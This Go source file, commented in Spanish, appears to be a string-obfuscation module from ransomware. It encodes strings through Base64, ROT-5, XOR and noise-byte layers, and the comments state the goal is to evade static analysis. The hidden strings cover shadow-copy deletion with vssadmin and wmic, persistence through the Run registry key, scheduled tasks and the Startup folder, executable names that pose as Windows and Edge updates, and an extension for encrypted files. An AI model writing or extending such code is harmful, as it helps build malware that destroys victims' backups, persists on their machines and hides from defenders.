package utils

import (
	"encoding/base64"
	"strings"
)

// Sistema de ofuscación multicapa para strings sensibles
//
// Este módulo implementa un sistema de ofuscación avanzado que aplica
// múltiples transformaciones para dificultar el análisis estático:
//
// 1. Inserción de bytes de ruido: Se insertan bytes calculados en posiciones
//    específicas para aumentar el tamaño y dificultar patrones
// 2. XOR con clave: Transformación XOR con clave 0x42
// 3. Rotación de caracteres (ROT-N): Desplazamiento de 5 posiciones en ASCII
// 4. Codificación Base64: Capa final de codificación
//
// Para decodificar se aplican las transformaciones en orden inverso,
// asegurando que el análisis estático no revele fácilmente las cadenas originales.

// ObfuscatedStrings contiene strings sensibles ofuscados con múltiples capas
// Base64 -> ROT-5 -> XOR(0x42) -> Eliminación de bytes de ruido
var ObfuscatedStrings = struct {
	VssAdmin       string
	WmicShadow     string
	Powershell     string
	ShadowCopyCmd  string
	RegistryRun    string
	TaskScheduler  string
	StartupFolder  string
	SystemInfoFile string
	RegValueName   string
	TaskName       string
	ExeName        string
	CmdExe         string
	Delete         string
	Shadows        string
	All            string
	Quiet          string
	Create         string
	Query          string
}{
	VssAdmin:       multiLayerDecode("OVQ2WzZeKGUrcDR3MHoxgQ==", 0x42, 5),                                                                                                 // vssadmin
	WmicShadow:     multiLayerDecode("OlQ0WzBeJmU=", 0x42, 5),                                                                                                             // wmic
	Powershell:     multiLayerDecode("N1QyWzpeLGU1cDZ3L3osgTMMMxNxFiwdPygsLw==", 0x42, 5),                                                                                 // powershell.exe
	ShadowCopyCmd:  multiLayerDecode("NlQvWyheK2UycDp3JnoygTcMQBM=", 0x42, 5),                                                                                             // shadowcopy
	RegistryRun:    multiLayerDecode("FlQSWwleG2UacAh3FXoMgSMMFBMwFiYdNSgyLzYyMjkpRDvLI84a1TDgMecr6jLxOvw2AyOGBo08mDWfNaIsqTG0O7sZvixFNVA2VzBaMmExbCNzFXY8fTEI", 0x42, 5), // SOFTWARE\Microsoft\Windows\CurrentVersion\Run
	TaskScheduler:  multiLayerDecode("NlQmWy9eO2UocDZ3Lno2gQ==", 0x42, 5),                                                                                                 // schtasks
	StartupFolder:  multiLayerDecode("FlQ7WyheNWU7cDx3N3o=", 0x42, 5),                                                                                                     // Startup
	SystemInfoFile: multiLayerDecode("NlRAWzZeO2UscDR3InowgTEMKRMyFnEdLSg2LzIyMTk=", 0x42, 5),                                                                             // system_info.json
	RegValueName:   multiLayerDecode("GlQwWzFeK2UycDp3NnoWgSwMJhM8FjUdMCg7L0AyHDk3RCvLKM471Szg", 0x42, 5),                                                                 // WindowsSecurityUpdate
	TaskName:       multiLayerDecode("FFQwWyZeNWUycDZ3MnopgTsMDBMrFiodLCgcLzcyKzkoRDvLLM4b1SjgNucu6g==", 0x42, 5),                                                         // MicrosoftEdgeUpdateTask
	ExeName:        multiLayerDecode("GlQwWzFeK2UycDp3NnocgTcMKxMoFjsdLChxLywyPzksRA==", 0x42, 5),                                                                         // WindowsUpdate.exe
	CmdExe:         multiLayerDecode("JlQ0WytecWUscD93LHo=", 0x42, 5),                                                                                                     // cmd.exe
	Delete:         multiLayerDecode("K1QsWzNeLGU7cCx3", 0x42, 5),                                                                                                         // delete
	Shadows:        multiLayerDecode("NlQvWyheK2UycDp3Nno=", 0x42, 5),                                                                                                     // shadows
	All:            multiLayerDecode("KFQzWzNe", 0x42, 5),                                                                                                                 // all
	Quiet:          multiLayerDecode("GFQ8WzBeLGU7cA==", 0x42, 5),                                                                                                         // Quiet
	Create:         multiLayerDecode("BlQ1WyxeKGU7cCx3", 0x42, 5),                                                                                                         // Create
	Query:          multiLayerDecode("GFQ8WyZeNWVAcA==", 0x42, 5),                                                                                                         // Query
}

// multiLayerDecode aplica múltiples capas de ofuscación:
// 1. Decode Base64
// 2. Rotación inversa de caracteres (ROT-N)
// 3. XOR con key
// 4. Eliminación de caracteres de ruido insertados en posiciones específicas
func multiLayerDecode(encoded string, key byte, rotShift int) string {
	// Capa 1: Decodificar Base64
	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return encoded
	}

	// Capa 2: Aplicar rotación inversa (ROT-N)
	rotated := make([]byte, len(decoded))
	for i := range decoded {
		rotated[i] = decoded[i] - byte(rotShift)
	}

	// Capa 3: Aplicar XOR con la key
	xored := make([]byte, len(rotated))
	for i := range rotated {
		xored[i] = rotated[i] ^ key
	}

	// Capa 4: Eliminar caracteres de ruido insertados
	// Se insertaron caracteres en posiciones pares durante la codificación
	var result []byte
	for i := 0; i < len(xored); i++ {
		// Mantener solo caracteres en posiciones impares (0, 2, 4, 6...)
		if i%2 == 0 {
			result = append(result, xored[i])
		}
	}

	return string(result)
}

// buildPath construye paths ofuscados dinámicamente
func buildPath(parts ...string) string {
	return strings.Join(parts, string([]byte{92})) // 92 = '\'
}

// GetEncryptedExtension genera extensión para archivos cifrados
func GetEncryptedExtension() string {
	// Ofuscar extensión .file
	ext := []byte{46, 102, 105, 108, 101} // .file
	return string(ext)
}

// GetRegistryPath construye la ruta del registro dinámicamente
func GetRegistryPath() string {
	parts := []string{
		multiLayerDecode("FlQSWwleG2UacAh3FXoMgQ==", 0x42, 5),                 // SOFTWARE
		multiLayerDecode("FFQwWyZeNWUycDZ3MnopgTsM", 0x42, 5),                 // Microsoft
		multiLayerDecode("GlQwWzFeK2UycDp3Nno=", 0x42, 5),                     // Windows
		multiLayerDecode("BlQ8WzVeNWUscDF3O3oZgSwMNRM2FjAdMigxLw==", 0x42, 5), // CurrentVersion
		multiLayerDecode("FVQ8WzFe", 0x42, 5),                                 // Run
	}
	return buildPath(parts...)
}

// GetStartupPath construye la ruta de Startup dinámicamente
func GetStartupPath() string {
	parts := []string{
		multiLayerDecode("FFQwWyZeNWUycDZ3MnopgTsM", 0x42, 5),     // Microsoft
		multiLayerDecode("GlQwWzFeK2UycDp3Nno=", 0x42, 5),         // Windows
		multiLayerDecode("FlQ7WyheNWU7cGd3FHosgTEMPBM=", 0x42, 5), // Start Menu
		multiLayerDecode("F1Q1WzJeKmU1cCh3NHo2gQ==", 0x42, 5),     // Programs
		multiLayerDecode("FlQ7WyheNWU7cDx3N3o=", 0x42, 5),         // Startup
	}
	return buildPath(parts...)
}
